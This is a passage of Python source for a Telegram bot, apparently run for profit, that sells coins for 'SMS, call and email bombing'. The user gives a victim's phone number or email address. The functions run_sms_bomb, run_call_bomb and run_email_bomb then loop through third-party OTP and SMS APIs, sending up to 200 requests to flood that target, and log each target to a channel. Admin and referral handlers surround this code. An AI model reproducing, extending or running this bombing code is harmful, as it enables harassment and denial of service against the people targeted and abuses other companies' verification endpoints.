            f"├ 👥 𝐓𝐨𝐭𝐚𝐥 𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬: {total_referral}\n"
            f"├ 💰 𝐁𝐚𝐥𝐚𝐧𝐜𝐞: {balance} 𝐂𝐨𝐢𝐧𝐬\n"
            f"├ 📆 𝐉𝐨𝐢𝐧𝐞𝐝: {joined_date}\n"
            f"├ ⚠️ 𝐒𝐭𝐚𝐭𝐮𝐬: ✅ 𝐀𝐜𝐭𝐢𝐯𝐞\n"
            f"│\n"
            f"╰── 👨‍💻 𝐃𝐞𝐯: 𝓜𝓻. 𝓐𝐛𝐮 𝐓𝐚𝐡𝐞𝐫"
        )

        try:
            photos = await context.bot.get_user_profile_photos(user_id=user_id, limit=1)
            if photos and photos.total_count > 0:
                photo_file_id = photos.photos[0][-1].file_id
                await update.message.reply_photo(photo=photo_file_id, caption=profile_text)
            else:
                await update.message.reply_text(profile_text)
        except Exception:
            await update.message.reply_text(profile_text)

    elif text == to_bold_sans("💰 BUY COIN") or text == "💰 BUY COIN":
        buy_text = to_bold_sans(
            "💰 𝐁𝐔𝐘 𝐂𝐎𝐈𝐍𝐒\n\n"
            "To Purchase Coins, Please Contact Admin.\n\n"
            "👨‍💻 Admin Username: @mrabutaher\n\n"
            "Contact Admin to Buy Coins."
        )
        buy_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(to_bold_sans("👨‍💻 Contact Admin"), url="https://t.me/mrabutaher", style="primary")]
        ])
        await update.message.reply_text(buy_text, reply_markup=buy_keyboard)

    elif text == to_bold_sans("🏆 LEADERBOARD") or text == "🏆 LEADERBOARD":
        lb_keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(to_bold_sans("🏆 Referral Board"), callback_data="lb_ref", style="primary"),
                InlineKeyboardButton(to_bold_sans("💰 Balance Board"), callback_data="lb_bal", style="success")
            ]
        ])
        await update.message.reply_text(to_bold_sans("🏆 Please choose a leaderboard category:"), reply_markup=lb_keyboard)

    elif text == to_bold_sans("🔗 Referral Link") or text == "🔗 Referral Link":
        bot_info = await context.bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
        bonus_per_ref = db.get("refer_bonus", 1)
        share_text = "🔥 𝗕𝗲𝘀𝘁 𝗘𝗺𝗮𝗶𝗹, 𝗦𝗠𝗦 & 𝗖𝗮𝗹𝗹 𝗕𝗼𝗺𝗯𝗲𝗿 𝗕𝗼𝘁!\n𝗨𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝘁𝗼 𝘀𝗲𝗻𝗱 𝗳𝗮𝘀𝘁 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝘀 𝗲𝗮𝘀𝗶𝗹𝘆."
        share_url = f"https://t.me/share/url?url={quote(ref_link, safe='')}&text={quote(share_text, safe='')}"
        share_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(to_bold_sans("🔗 Share Referral Link"), url=share_url, style="primary")]])
        await update.message.reply_text(
            to_bold_sans(f"🎉 YOUR REFERRAL LINK\n\n🔗 {ref_link}\n\n🎁 Bonus Per Referral: {bonus_per_ref}\n\n📢 Share with your friends!"),
            reply_markup=share_keyboard
        )

    elif text == to_bold_sans("🎟️ Redeem Code") or text == "🎟️ Redeem Code":
        await update.message.reply_text(
            to_bold_sans("🎟️ Please send your redeem code:"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter redeem code here..."))
        )
        return REDEEM_CODE_STATE

    elif (text == to_bold_sans("📢 Broadcast") or text == "📢 Broadcast") and user_id in [OWNER_ID, ADMIN_ID]:
        bc_menu_keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(to_bold_sans("👤 Single / Multiple Broadcast"), callback_data="bc_single", style="primary"),
                InlineKeyboardButton(to_bold_sans("📢 All Broadcast"), callback_data="bc_all", style="success")
            ]
        ])
        await update.message.reply_text(to_bold_sans("📢 Select Broadcast Type:"), reply_markup=bc_menu_keyboard)

    elif (text == to_bold_sans("➕ Add Balance") or text == "➕ Add Balance") and user_id in [OWNER_ID, ADMIN_ID]:
        await update.message.reply_text(
            to_bold_sans("➕ Enter Chat ID and Amount to add balance:\n(Format: CHAT_ID AMOUNT)"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("e.g. 123456789 100")),
            parse_mode="Markdown"
        )
        return ADD_COIN_STATE

    elif (text == to_bold_sans("➖ Cut Balance") or text == "➖ Cut Balance") and user_id in [OWNER_ID, ADMIN_ID]:
        await update.message.reply_text(
            to_bold_sans("➖ Enter Chat ID and Amount to deduct balance:\n(Format: CHAT_ID AMOUNT)"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("e.g. 123456789 50")),
            parse_mode="Markdown"
        )
        return CUT_COIN_STATE

    elif (text == to_bold_sans("🔍 Search User") or text == "🔍 Search User") and user_id in [OWNER_ID, ADMIN_ID]:
        await update.message.reply_text(
            to_bold_sans("🔍 Enter User Chat ID to search:"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter chat id..."))
        )
        return SEARCH_USER_STATE

    elif (text and ("Maintenance:" in text or "𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞" in text)) and user_id in [OWNER_ID, ADMIN_ID]:
        current_status = db.get("maintenance_mode", False)
        db["maintenance_mode"] = not current_status
        save_db(db)
        
        maint_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(to_bold_sans("✏️ Set Maintenance Message"), callback_data="set_maint_msg", style="primary")]
        ])
        status_str = "ON 🟢" if db["maintenance_mode"] else "OFF 🔴"
        await update.message.reply_text(to_bold_sans(f"⚙️ Maintenance Mode is now {status_str}"), parse_mode="Markdown", reply_markup=maint_kb)
        
        ref_bonus_val = db.get("refer_bonus", 1)
        await update.message.reply_text(to_bold_sans("Admin Panel updated:"), reply_markup=get_admin_keyboard(ref_bonus_val, db["maintenance_mode"]))

    elif (text == to_bold_sans("🚫 Ban User") or text == "🚫 Ban User") and user_id in [OWNER_ID, ADMIN_ID]:
        await update.message.reply_text(to_bold_sans("🚫 Send the User ID you want to ban:"), reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter user id to ban...")))
        return BAN_STATE

    elif (text == to_bold_sans("✅ Unban User") or text == "✅ Unban User") and user_id in [OWNER_ID, ADMIN_ID]:
        await update.message.reply_text(to_bold_sans("✅ Send the User ID you want to unban:"), reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter user id to unban...")))
        return UNBAN_STATE

    elif (text == to_bold_sans("➕ Add Force Channel") or text == "➕ Add Force Channel") and user_id in [OWNER_ID, ADMIN_ID]:
        await update.message.reply_text(to_bold_sans("➕ ফোর্স জয়েন চ্যানেল/গ্রুপ এড করতে ইউজারনেম (@channel) অথবা প্রাইভেট আইডি (-100...) দিন:"), reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("e.g. @channel or -100...")))
        return ADD_CHANNEL_STATE

    elif (text == to_bold_sans("➖ Remove Force Channel") or text == "➖ Remove Force Channel") and user_id in [OWNER_ID, ADMIN_ID]:
        channels = db.get("force_channels", [])
        ch_list = ' , '.join(channels) if channels else 'None'
        await update.message.reply_text(to_bold_sans(f"➖ Current Channels: {ch_list}\n\nSend channel username/ID to remove:"), reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("e.g. @mr_abutaher")))
        return REMOVE_CHANNEL_STATE

    elif (text == to_bold_sans("📋 Force Channels List") or text == "📋 Force Channels List") and user_id in [OWNER_ID, ADMIN_ID]:
        channels = db.get("force_channels", [])
        ch_list = "\n".join(channels) if channels else "No channels added yet."
        await update.message.reply_text(to_bold_sans(f"📋 Current Force Channels List:\n\n{ch_list}"))

    elif (text == to_bold_sans("🎟️ Create Code") or text == "🎟️ Create Code") and user_id in [OWNER_ID, ADMIN_ID]:
        await update.message.reply_text(to_bold_sans("🎟️ ধাপে ধাপে রিডিম কোড জেনারেট:\nপ্রথমে রিডিম কোডটি দিন (যেমন: FREE100):"), reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter redeem code...")))
        return CREATE_CODE_CODE

    elif (text and ("Set Refer Bonus" in text or "𝐑𝐞𝐟𝐞𝐫 𝐁𝐨𝐧𝐮𝐬" in text)) and user_id in [OWNER_ID, ADMIN_ID]:
        current_bonus = db.get("refer_bonus", 1)
        await update.message.reply_text(
            to_bold_sans(f"⚙️ Current Referral Bonus: {current_bonus} coin\n\nPlease enter the new referral bonus amount (number only):"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter new bonus number...")),
            parse_mode="Markdown"
        )
        return SET_REF_BONUS_STATE

async def callback_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    db = load_db()

    if data == "verify_sub":
        await verify_sub_callback(update, context)
        return

    elif data == "lb_ref":
        user_refs = []
        for uid, udata in db["users"].items():
            total_ref = sum(1 for u in db["users"].values() if u.get("referred_by") == uid)
            name = udata.get("first_name", f"User {uid}")
            user_refs.append((name, total_ref))
        
        user_refs.sort(key=lambda x: x[1], reverse=True)
        top_10 = user_refs[:10]
        
        medals = ["🥇", "🥈", "🥉"]
        lb_text = "🏆 TOP 10 REFERRAL USERS\n\n"
        for idx, (name, count) in enumerate(top_10, 1):
            prefix = medals[idx-1] if idx <= 3 else f"{idx}"
            lb_text += f"{prefix} {name} — {count} Referrals\n"
        if not top_10:
            lb_text += "No referral data available yet."
        await query.answer()
        await query.message.edit_text(to_bold_sans(lb_text))

    elif data == "lb_bal":
        user_bals = []
        for uid, udata in db["users"].items():
            name = udata.get("first_name", f"User {uid}")
            bal = udata.get("balance", 0)
            user_bals.append((name, bal))
        
        user_bals.sort(key=lambda x: x[1], reverse=True)
        top_10 = user_bals[:10]
        
        medals = ["🥇", "🥈", "🥉"]
        lb_text = "💰 TOP 10 BALANCE USERS\n\n"
        for idx, (name, bal) in enumerate(top_10, 1):
            prefix = medals[idx-1] if idx <= 3 else f"{idx}"
            lb_text += f"{prefix} {name} — {bal} Coins\n"
        if not top_10:
            lb_text += "No balance data available yet."
        await query.answer()
        await query.message.edit_text(to_bold_sans(lb_text))

    elif data == "bc_single" and user_id in [OWNER_ID, ADMIN_ID]:
        await query.answer()
        await query.message.reply_text(
            to_bold_sans("👤 Enter User Chat ID(s):\nYou can enter a single ID or multiple IDs separated by commas (,) or spaces."),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("123456789, 987654321"))
        )
        return SINGLE_BC_USER_STATE

    elif data == "bc_all" and user_id in [OWNER_ID, ADMIN_ID]:
        await query.answer()
        await query.message.reply_text(
            to_bold_sans("📢 Send your broadcast message/media (photo, video, document or text) for ALL USERS now:"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Send media or text..."))
        )
        context.user_data["bc_type"] = "all"
        context.user_data["bc_text"] = ""
        context.user_data["bc_media"] = None
        context.user_data["bc_buttons"] = []
        return BROADCAST_MEDIA

    elif data == "set_maint_msg" and user_id in [OWNER_ID, ADMIN_ID]:
        await query.answer()
        await query.message.reply_text(
            to_bold_sans("✏️ Please send the new Maintenance Message:"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter maintenance message..."))
        )
        return MAINT_MSG_STATE

async def single_bc_user_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        db = load_db()
        await update.message.reply_text(to_bold_sans("❌ Broadcast cancelled."), reply_markup=get_admin_keyboard(db.get("refer_bonus", 1), db.get("maintenance_mode", False)))
        return ConversationHandler.END

    raw_ids = text.replace(",", " ").split()
    valid_ids = []
    for uid in raw_ids:
        if uid.isdigit():
            valid_ids.append(uid)

    if not valid_ids:
        await update.message.reply_text(to_bold_sans("❌ No valid User IDs found! Please try again:"))
        return SINGLE_BC_USER_STATE

    context.user_data["bc_type"] = "single"
    context.user_data["bc_target_users"] = valid_ids
    context.user_data["bc_text"] = ""
    context.user_data["bc_media"] = None
    context.user_data["bc_buttons"] = []

    await update.message.reply_text(
        to_bold_sans("📢 Now send the message/media (photo, video, document or text) to send to these users:"),
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Send media or text..."))
    )
    return BROADCAST_MEDIA

async def run_sms_bomb(bot, user_id, user_id_str, user_full_name, phone, actual_count):
    success_count = 0
    fail_count = 0
    stopped_by_user = False
    
    for i in range(1, actual_count + 1):
        if not active_bomb_flags.get(user_id_str, True):
            stopped_by_user = True
            break
        api_config = SMS_APIS[(i - 1) % len(SMS_APIS)]
        status, response = send_sms_request(phone, api_config)
        if status in [200, 201]:
            success_count += 1
        else:
            fail_count += 1
        await asyncio.sleep(0.3)

    log_report = (
        f"🚀 SMS Bomber Log Report\n\n"
        f"👤 User: {user_full_name} ({user_id})\n"
        f"📱 Target Phone: {phone}\n"
        f"📦 Total Requested: {success_count + fail_count}\n"
        f"✨ Success: {success_count} |\n"
        f"❌ Failed: {fail_count}"
    )
    await send_log_to_channel(bot, log_report)

    try:
        if stopped_by_user:
            msg_text = f"❌ SMS Bombing Stopped by User.\n📦 Total Sent: {success_count + fail_count}\n✨ Success: {success_count}\n❌ Failed: {fail_count}"
        else:
            msg_text = f"✅ SMS Bombing Completed!\n📦 Total Sent: {success_count + fail_count}\n✨ Success: {success_count}\n❌ Failed: {fail_count}"
        await bot.send_message(chat_id=user_id, text=to_bold_sans(msg_text), reply_markup=get_user_keyboard())
    except:
        pass

async def receive_sms_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit() or len(text) < 10:
        await update.message.reply_text(
            to_bold_sans("❌ Invalid mobile number! Please enter a valid mobile number:"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("e.g. 017XXXXXXXX"))
        )
        return SMS_PHONE

    context.user_data["target_phone"] = text
    await update.message.reply_text(
        to_bold_sans("🔢 How many limits of SMS requests do you want to send? (Each limit = 20 requests, enter 1 to 10):"),
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter number (1-10)...")),
        parse_mode="Markdown"
    )
    return SMS_LIMIT

async def receive_sms_limit_and_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ Please enter a valid number between 1 and 10:"))
        return SMS_LIMIT
        
    user_limit = int(text)
    if user_limit < 1 or user_limit > 10:
        await update.message.reply_text(to_bold_sans("❌ Limit must be between 1 and 10. Please enter again:"), parse_mode="Markdown")
        return SMS_LIMIT

    user = update.effective_user
    user_id = user.id
    user_id_str = str(user_id)
    user_full_name = user.full_name
    db = load_db()

    current_bal = db["users"].get(user_id_str, {}).get("balance", 0)
    if current_bal < 1:
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ You don't have enough balance! You need at least 1 coin to use SMS Bomber."), reply_markup=keyboard)
        return ConversationHandler.END

    db["users"][user_id_str]["balance"] -= 1
    save_db(db)

    actual_count = user_limit * 20
    phone = context.user_data.get("target_phone")
    active_bomb_flags[user_id_str] = True
    
    asyncio.create_task(run_sms_bomb(context.bot, user_id, user_id_str, user_full_name, phone, actual_count))

    keyboard = get_user_keyboard()
    await update.message.reply_text(
        to_bold_sans(f"⏳ Starting SMS bombing in background... Deducted 1 coin. Sending {actual_count} requests to {phone}\n\nType /stop anytime to cancel."), 
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def run_call_bomb(bot, user_id, user_id_str, user_full_name, phone, user_limit):
    active_bomb_flags[user_id_str] = True
    
    status, response = send_call_request(phone, user_limit)
    stopped_by_user = not active_bomb_flags.get(user_id_str, True)
    
    success = status == 200
    log_report = (
        f"🚀 Call Bomber Log Report\n\n"
        f"👤 User: {user_full_name} ({user_id})\n"
        f"📞 Target Phone: {phone}\n"
        f"📦 Limit: {user_limit} (Delay: 10s)\n"
        f"✨ Status: {'Success' if success else 'Failed'}"
    )
    await send_log_to_channel(bot, log_report)

    try:
        if stopped_by_user:
            msg_text = "❌ Call Bombing Stopped by User."
        elif success:
            msg_text = f"✅ Call Bombing Completed Successfully!\n📞 Target: {phone}\n📦 Limit: {user_limit} (10s Delay)"
        else:
            msg_text = "❌ Call Bombing Failed or API Timeout!"
        await bot.send_message(chat_id=user_id, text=to_bold_sans(msg_text), reply_markup=get_user_keyboard(), parse_mode="Markdown")
    except:
        pass

async def receive_call_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit() or len(text) < 10:
        await update.message.reply_text(
            to_bold_sans("❌ Invalid mobile number! Please enter a valid mobile number:"),
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("e.g. 01930486479"))
        )
        return CALL_PHONE

    context.user_data["target_call_phone"] = text
    await update.message.reply_text(
        to_bold_sans("🔢 Enter Call limit (1 to 10, Permanent Delay 10s):"),
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter limit (1-10)...")),
        parse_mode="Markdown"
    )
    return CALL_LIMIT

async def receive_call_limit_and_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ Please enter a valid number between 1 and 10:"))
        return CALL_LIMIT
        
    user_limit = int(text)
    if user_limit < 1 or user_limit > 10:
        await update.message.reply_text(to_bold_sans("❌ Limit must be between 1 and 10. Please enter again:"), parse_mode="Markdown")
        return CALL_LIMIT

    user = update.effective_user
    user_id = user.id
    user_id_str = str(user_id)
    user_full_name = user.full_name
    db = load_db()

    current_bal = db["users"].get(user_id_str, {}).get("balance", 0)
    if current_bal < 1:
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ You don't have enough balance! You need at least 1 coin to use Call Bomber."), reply_markup=keyboard)
        return ConversationHandler.END

    db["users"][user_id_str]["balance"] -= 1
    save_db(db)

    phone = context.user_data.get("target_call_phone")
    active_bomb_flags[user_id_str] = True
    
    asyncio.create_task(run_call_bomb(context.bot, user_id, user_id_str, user_full_name, phone, user_limit))

    keyboard = get_user_keyboard()
    await update.message.reply_text(
        to_bold_sans(f"⏳ Starting Call bombing in background... Deducted 1 coin. Target: {phone} (Limit: {user_limit}, Delay: 10s)\n\nType /stop anytime to cancel."), 
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def run_email_bomb(bot, user_id, user_id_str, user_full_name, email, actual_count):
    success_count = 0
    fail_count = 0
    stopped_by_user = False
    
    for i in range(1, actual_count + 1):
        if not active_bomb_flags.get(user_id_str, True):
            stopped_by_user = True
            break
        status, response = send_cosmotown_otp(email)
        if status == 200:
            success_count += 1
        else:
            fail_count += 1
        await asyncio.sleep(0.3)

    log_report = (
        f"🚀 Email Bomber Log Report\n\n"
        f"👤 User: {user_full_name} ({user_id})\n"
        f"📧 Target Email: {email}\n"
        f"📦 Total Requested: {success_count + fail_count}\n"
        f"✨ Success: {success_count} |\n"
        f"❌ Failed: {fail_count}"
    )
    await send_log_to_channel(bot, log_report)

    try:
        if stopped_by_user:
            msg_text = f"❌ Email Bombing Stopped by User.\n📦 Total Sent: {success_count + fail_count}\n✨ Success: {success_count}\n❌ Failed: {fail_count}"
        else:
            msg_text = f"✅ Email Bombing Completed!\n📦 Total Sent: {success_count + fail_count}\n✨ Success: {success_count}\n❌ Failed: {fail_count}"
        await bot.send_message(chat_id=user_id, text=to_bold_sans(msg_text), reply_markup=get_user_keyboard())
    except:
        pass

async def receive_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if "@" not in text or "." not in text:
        await update.message.reply_text(to_bold_sans("❌ Invalid email format! Please enter a valid email address:"))
        return GET_EMAIL

    context.user_data["target_email"] = text
    await update.message.reply_text(
        to_bold_sans("🔢 How many limits of Email requests do you want to send? (Each limit = 14 requests, enter 1 to 10):"),
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter number (1-10)...")),
        parse_mode="Markdown"
    )
    return GET_LIMIT

async def receive_limit_and_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ Please enter a valid number between 1 and 10:"))
        return GET_LIMIT
        
    user_limit = int(text)
    if user_limit < 1 or user_limit > 10:
        await update.message.reply_text(to_bold_sans("❌ Limit must be between 1 and 10. Please enter again:"), parse_mode="Markdown")
        return GET_LIMIT

    user = update.effective_user
    user_id = user.id
    user_id_str = str(user_id)
    user_full_name = user.full_name
    db = load_db()

    current_bal = db["users"].get(user_id_str, {}).get("balance", 0)
    if current_bal < 1:
        keyboard = get_user_keyboard()
        await update.message.reply_text(to_bold_sans("❌ You don't have enough balance! You need at least 1 coin to use Email Bomber."), reply_markup=keyboard)
        return ConversationHandler.END

    db["users"][user_id_str]["balance"] -= 1
    save_db(db)

    actual_count = user_limit * 14
    email = context.user_data.get("target_email")
    active_bomb_flags[user_id_str] = True
    
    asyncio.create_task(run_email_bomb(context.bot, user_id, user_id_str, user_full_name, email, actual_count))

    keyboard = get_user_keyboard()
    await update.message.reply_text(
        to_bold_sans(f"⏳ Starting email bombing in background... Deducted 1 coin. Sending {actual_count} OTP requests to {email}\n\nType /stop anytime to cancel."), 
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def create_code_code_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    context.user_data["new_code"] = text
    await update.message.reply_text(
        to_bold_sans("👥 এখন কোডটির জন্য কতজন ইউজার লিমিট হবে তা সংখ্যায় দিন (যেমন: 10):"),
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter limit..."))
    )
    return CREATE_CODE_LIMIT

async def create_code_limit_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ দয়া করে সঠিক সংখ্যা দিন:"))
        return CREATE_CODE_LIMIT

    context.user_data["new_limit"] = int(text)
    await update.message.reply_text(
        to_bold_sans("🪙 এখন কোডটিতে কত কয়েন দেওয়া হবে তা সংখ্যায় দিন (যেমন: 5):"),
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton(to_bold_sans("❌ Cancel"), style="danger")]], resize_keyboard=True, input_field_placeholder=to_bold_sans("Enter coin..."))
    )
    return CREATE_CODE_COIN

async def create_code_coin_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    ref_bonus_val = db.get("refer_bonus", 1)
    keyboard = get_admin_keyboard(ref_bonus_val, db.get("maintenance_mode", False))

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=keyboard)
        return ConversationHandler.END

    if not text.isdigit():
        await update.message.reply_text(to_bold_sans("❌ দয়া করে সঠিক সংখ্যা দিন:"))
        return CREATE_CODE_COIN

    coin_val = int(text)
    code = context.user_data.get("new_code")
    limit_val = context.user_data.get("new_limit")

    if "redeem_codes" not in db:
        db["redeem_codes"] = {}

    db["redeem_codes"][code] = {
        "limit": limit_val,
        "coin": coin_val,
        "used_count": 0,
        "used_users": []
    }
    save_db(db)

    await update.message.reply_text(
        to_bold_sans(f"✅ Redeem Code Created Successfully!\n\n🎟️ Code: {code}\n👤 Limit: {limit_val}\n🪙 Coin: {coin_val}"),
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    return ConversationHandler.END

async def receive_redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    db = load_db()
    user_id = update.effective_user.id
    user_id_str = str(user_id)

    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        await update.message.reply_text(to_bold_sans("❌ Operation cancelled."), reply_markup=get_user_keyboard())
        return ConversationHandler.END

    codes = db.get("redeem_codes", {})
    if text not in codes:
        await update.message.reply_text(to_bold_sans("❌ Invalid redeem code!"), reply_markup=get_user_keyboard())
        return ConversationHandler.END

    c_data = codes[text]
    if c_data["used_count"] >= c_data["limit"]:
        await update.message.reply_text(to_bold_sans("❌ This redeem code limit is over!"), reply_markup=get_user_keyboard())
        return ConversationHandler.END

    if user_id_str in c_data.get("used_users", []):
        await update.message.reply_text(to_bold_sans("❌ You have already used this redeem code!"), reply_markup=get_user_keyboard())
        return ConversationHandler.END

    c_data["used_count"] += 1
    if "used_users" not in c_data:
        c_data["used_users"] = []
    c_data["used_users"].append(user_id_str)

    if user_id_str not in db["users"]:
        db["users"][user_id_str] = {"balance": 0, "username": update.effective_user.username or "None", "referred_by": None}

    db["users"][user_id_str]["balance"] += c_data["coin"]
    save_db(db)

    await update.message.reply_text(to_bold_sans(f"✅ Successfully redeemed! You received +{c_data['coin']} coins."), reply_markup=get_user_keyboard())
    return ConversationHandler.END

async def bc_media_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == to_bold_sans("❌ Cancel") or text == "❌ Cancel":
        db = load_db()
        await update.message.reply_text(to_bold_sans("❌ Broadcast cancelled."), reply_markup=get_admin_keyboard(db.get("refer_bonus", 1), db.get("maintenance_mode", False)))
        return ConversationHandler.END

    if text == to_bold_sans("⏭️ Skip") or text == "⏭️ Skip":
        context.user_data["bc_text"] = "No text provided."
    else:
        if update.message.photo:
            context.user_data["bc_media"] = ("photo", update.message.photo[-1].file_id)
            context.user_data["bc_text"] = update.message.caption or ""
        elif update.message.video:
            context.user_data["bc_media"] = ("video", update.message.video.file_id)
            context.user_data["bc_text"] = update.message.caption or ""
        elif update.message.document:
            context.user_data["bc_media"] = ("document", update.message.document.file_id)
            context.user_data["bc_text"] = update.message.caption or ""
        else:
            context.user_data["bc_text"] = update.message.text

    await update.message.reply_text(
